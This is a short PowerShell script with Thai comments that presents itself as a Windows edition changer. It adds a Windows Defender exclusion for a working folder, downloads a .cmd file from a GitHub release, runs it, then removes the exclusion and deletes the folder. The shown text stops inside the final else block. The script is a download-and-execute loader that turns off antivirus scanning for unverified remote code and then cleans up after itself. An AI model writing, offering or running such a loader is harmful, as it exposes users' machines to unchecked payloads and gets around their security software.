# 1. ตั้งค่าตัวแปร
$workDir = "C:\phwyverysad"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/change_windows_edition.cmd"
$fileName = "change_windows_edition.cmd"
$filePath = Join-Path $workDir $fileName

# 2. สร้างโฟลเดอร์สำหรับทำงาน
if (!(Test-Path $workDir)) {
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
}

# 3. เพิ่ม Exclusion ให้โฟลเดอร์เพื่อป้องกันการสแกนของ Windows Defender
Write-Host "Configuring exclusion for $workDir..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $workDir

# 4. ดาวน์โหลดไฟล์โดยใช้ .NET (WebClient)
Write-Host "Downloading $fileName..." -ForegroundColor Cyan
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $filePath)
}
catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    exit
}

# 5. สั่งรันไฟล์ .cmd และรอจนกว่ากระบวนการจะปิดตัวลง
if (Test-Path $filePath) {
    Write-Host "Running $fileName and waiting for it to close..." -ForegroundColor Yellow
    $process = Start-Process -FilePath $filePath -Wait -PassThru
    
    # 6. เมื่อปิดตัวลงแล้ว ให้ทำการลบข้อมูลและข้อยกเว้นออก
    Write-Host "Cleaning up..." -ForegroundColor Green
    
    # ลบข้อยกเว้นออก (Optional)
    Remove-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    
    # ลบโฟลเดอร์และไฟล์ทั้งหมด
    Remove-Item -Path $workDir -Recurse -Force
    Write-Host "All processes completed." -ForegroundColor White
}
else {
    Write-Host "File not found!" -ForegroundColor Red
